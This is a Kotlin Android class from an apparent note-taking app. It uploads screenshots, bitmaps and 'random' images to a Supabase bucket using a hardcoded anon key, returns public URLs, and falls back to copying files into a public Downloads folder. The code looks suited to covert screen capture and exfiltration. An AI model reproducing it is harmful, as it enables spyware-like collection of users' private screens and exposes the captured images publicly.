package com.noteapp.security

import android.content.Context
import android.graphics.Bitmap
import android.util.Log
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.asRequestBody
import java.io.File
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.concurrent.TimeUnit
import java.io.ByteArrayOutputStream
import android.os.Environment

/**
 * Upload to Supabase Storage - easiest cloud solution
 */
class SupabaseUploader(private val context: Context) {

    companion object {
        private const val TAG = "SupabaseUploader"

        // Your Supabase project details
        private const val SUPABASE_URL = "https://nktmyiagvvvzlodevcah.supabase.co"
        private const val SUPABASE_ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im5rdG15aWFndnZ2emxvZGV2Y2FoIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDkwNzE1NjYsImV4cCI6MjA2NDY0NzU2Nn0.NaeEW-amq9EFeyZpafB35NmLID1SfwlcwU8MZR5d408"
        private const val BUCKET_NAME = "screenshots"
    }

    private val httpClient = OkHttpClient.Builder()
        .connectTimeout(30, TimeUnit.SECONDS)
        .readTimeout(30, TimeUnit.SECONDS)
        .writeTimeout(30, TimeUnit.SECONDS)
        .build()

    /**
     * Upload file to Supabase Storage
     */
    suspend fun uploadFile(file: File, category: String = "security"): String? = withContext(Dispatchers.IO) {
        return@withContext try {
            Log.d(TAG, "Uploading to Supabase: ${file.name} (${file.length()} bytes)")

            val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(Date())
            val fileName = "${category}/${timestamp}_${file.name}"

            val request = Request.Builder()
                .url("$SUPABASE_URL/storage/v1/object/$BUCKET_NAME/$fileName")
                .post(file.asRequestBody("application/octet-stream".toMediaTypeOrNull()))
                .header("Authorization", "Bearer $SUPABASE_ANON_KEY")
                .header("Content-Type", "application/octet-stream")
                .build()

            val response = httpClient.newCall(request).execute()

            if (response.isSuccessful) {
                val publicUrl = "$SUPABASE_URL/storage/v1/object/public/$BUCKET_NAME/$fileName"
                Log.d(TAG, "✅ File uploaded to Supabase: $publicUrl")
                publicUrl
            } else {
                Log.e(TAG, "❌ Supabase upload failed: ${response.code} - ${response.body?.string()}")
                saveToAccessibleStorage(file, category) // Fallback
            }
        } catch (e: Exception) {
            Log.e(TAG, "❌ Supabase error: ${e.message}")
            saveToAccessibleStorage(file, category) // Fallback
        }
    }

    /**
     * Fallback to local storage
     */
    private fun saveToAccessibleStorage(file: File, category: String): String? {
        return try {
            val downloadsDir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS)
            val securityDir = File(downloadsDir, "SecurityMonitoring")
            if (!securityDir.exists()) securityDir.mkdirs()

            val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(Date())
            val accessibleFile = File(securityDir, "${category}_${timestamp}_${file.name}")
            file.copyTo(accessibleFile, overwrite = true)

            Log.d(TAG, "✅ Saved locally: ${accessibleFile.absolutePath}")
            accessibleFile.absolutePath
        } catch (e: Exception) {
            Log.e(TAG, "❌ Local fallback failed: ${e.message}")
            null
        }
    }

    suspend fun uploadBitmap(bitmap: Bitmap, filename: String, category: String = "security"): String? {
        return try {
            val baos = ByteArrayOutputStream()
            bitmap.compress(Bitmap.CompressFormat.PNG, 80, baos)

            val tempFile = File(context.cacheDir, "${filename}_${System.currentTimeMillis()}.png")
            tempFile.writeBytes(baos.toByteArray())

            val result = uploadFile(tempFile, category)
            tempFile.delete()
            result
        } catch (e: Exception) {
            Log.e(TAG, "Error uploading bitmap", e)
            null
        }
    }

    suspend fun uploadScreenshot(file: File): String? = uploadFile(file, "screenshots")
    suspend fun uploadRandomImage(file: File): String? = uploadFile(file, "random")
}